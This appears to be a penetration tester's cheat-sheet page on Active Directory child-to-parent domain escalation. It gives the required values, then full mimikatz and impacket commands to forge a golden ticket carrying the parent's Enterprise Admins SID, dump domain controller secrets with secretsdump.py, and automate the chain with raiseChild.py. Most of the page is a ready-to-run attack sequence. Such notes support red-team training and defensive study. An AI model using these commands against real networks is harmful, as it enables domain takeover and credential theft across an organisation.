---
title: Domain Trust Hopping
tags:
  - activedirectory
  - domaintrust
enableToc: "true"
---
### Child-Parent Domain Escalation
This attack made possible since there is no security boundary between domains. Hence we could forge a golden ticket that contains _extra sid_ of a parent domain's _Enterprise Admins_. Below are the requirements to perform this attack:

| Name | Value |
| --- | ----------- |
| Child domain krbtgt hash | `833ef1dcc490f88a8f4a8a00859736de ` |
| Child domain SID | `S-1-5-21-3263068140-2042698922-2891547269` |
| Child domain FQDN | child.domain.local |
| Parent domain EA SID | `S-1-5-21-378720957-2217973887-3501892633-519` |

1. Forge a [Golden Ticket](#golden-ticket) that contains _extra sid_ of the parent domain's Enterprise Admins.

```css
# windows
mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local [/ntlm|/aes256]:833ef1dcc490f88a8f4a8a00859736de /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-519 /ptt

# linux
ticketer.py -nthash 833ef1dcc490f88a8f4a8a00859736de -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain child.domain.local -extra-sid S-1-5-21-378720957-2217973887-3501892633-519 Administrator
```

2. Use the ticket to perform Pass The Ticket (PTT) and win!. Ensure to use FQDN if you encounter any errors. _Note that if you ran mimikatz command with `/ptt` flag already does the following step. Hence you might want to skip this step_

```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -no-pass
```

Above steps could be automated with [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) if you obtain a privileged account (i.e. Domain Admin). _-debug flag is <3_

```bash
raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashes :2e8a408a8aec852ef2e458b938b8c071 -debug
```